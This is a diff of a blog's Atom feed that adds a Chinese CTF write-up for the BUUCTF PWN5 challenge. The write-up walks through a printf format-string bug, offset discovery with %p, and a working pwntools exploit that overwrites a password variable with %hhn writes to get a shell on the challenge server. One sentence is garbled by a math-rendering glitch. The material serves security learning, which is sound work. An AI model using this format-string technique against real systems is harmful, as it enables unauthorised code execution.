@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://cc-nianchu.github.io</id>
     <title>nianchu</title>
-    <updated>2021-07-16T06:04:11.227Z</updated>
+    <updated>2021-07-17T02:37:59.781Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://cc-nianchu.github.io"/>
     <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
@@ -101,7 +101,86 @@ q.sendline(payload)
 
 q.interactive()
 </code></pre>
-<h2 id="ss">ss</h2>
+<h2 id="buu上的第五空间2019-决赛pwn5">buu上的[第五空间2019 决赛]PWN5</h2>
+<p>这是一道很明显格式化字符串不过应该还有其他的解法以后学了再来用其他的方法，主要是发现了/bin/sh<br>
+这道题我是用格式化字符串做的但是不是很熟练做了好久，又get到新知识。<br>
+首先checksec一下pwn5文件</p>
+<pre><code>Arch:     i386-32-little
+     RELRO:    Partial RELRO
+     Stack:    Canary found
+     NX:       NX enabled
+     PIE:      No PIE (0x8048000)
+</code></pre>
+<p>然后用ida32位打开pwn5文件 按F5打开伪代码</p>
+<pre><code>int __cdecl main(int a1)
+{
+  unsigned int v1; // eax
+  int result; // eax
+  int fd; // [esp+0h] [ebp-84h]
+  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
+  char buf[100]; // [esp+14h] [ebp-70h] BYREF
+  unsigned int v6; // [esp+78h] [ebp-Ch]
+  int *v7; // [esp+7Ch] [ebp-8h]
+
+  v7 = &amp;a1;
+  v6 = __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  v1 = time(0);
+  srand(v1);
+  fd = open(&quot;/dev/urandom&quot;, 0);
+  read(fd, &amp;dword_804C044, 4u);        //随机4位数
+  printf(&quot;your name:&quot;);
+  read(0, buf, 0x63u);
+  printf(&quot;Hello,&quot;);
+  printf(buf);
+  printf(&quot;your passwd:&quot;);
+  read(0, nptr, 0xFu);
+  if ( atoi(nptr) == dword_804C044 )
+  {
+     puts(&quot;ok!!&quot;);
+     system(&quot;/bin/sh&quot;);
+  }
+  else
+  {
+     puts(&quot;fail&quot;);
+  }
+  result = 0;
+  if ( __readgsdword(0x14u) != v6 )
+     sub_80493D0();
+  return result;
+}
+</code></pre>
+<p>能运行system(&quot;/bin/sh&quot;)很明显是要atoi(nptr)=dword_804C044，这是一道验证账号密码题目，密码在上面会随机4位数，但是我们利用格式化字符串将密码改成自己想要的就行了，%d读取数字，%x读取地址，%s读取任意地址的内容，%n任意地址写入。 例如aaaa%n=4,因为要写入4位数所以我们在0x804C044这个地址上得分4byte<br>
+<img src="https://cc-nianchu.github.io/post-images/1626489125752.png" alt="" loading="lazy"><br>
+这里配合上面讲的%10<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">样</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">道</mi><mi mathvariant="normal">理</mi><mi mathvariant="normal">，</mi></mrow><annotation encoding="application/x-tex">n，一样的道理，%10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">道</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">，</span></span></span></span>n是一次占4个字节，因此我们分开。<br>
+首先我们得找到偏移量，打开程序输入AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</p>
+<pre><code>your name:AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+Hello,AAAA 0xffe1b8d8 0x63 (nil) 0xf7f8da9c 0x3 0xf7f60410 0x1 (nil) 0x1 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
+��s��your passwd:
+</code></pre>
+<p>我们可以发现第十个就是偏移量，现在也找到偏移量也找到函数地址0x804c044，直接上EXP</p>
+<pre><code>from pwn import*
+#q=process(&quot;./pwn5&quot;)
+
+q=remote('node4.buuoj.cn',28993)
+
+addr=0x0804c044
+
+payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)
+
+payload+='%10$hhn%11$hhn%12$hhn%13$hhn'
+#payload+='%10$n%11$n%12$n%13$n'
+#q.recvuntil(&quot;your name:\n&quot;)
+q.sendline(payload)
+
+#q.recvuntil(&quot;your passwd:\n&quot;)
+payload=str(0x10101010)
+
+q.sendline(payload)
+
+q.interactive()
+</code></pre>
+<p>另外提醒一下  py文件不能起名为pwn.py，我也不懂为什么，反正起名了这个我搞了好久都是有错误上网找了好久都不行，后面发现改了个名字就能运行了。。。。。。。。</p>
 ]]></content>
     </entry>
     <entry>
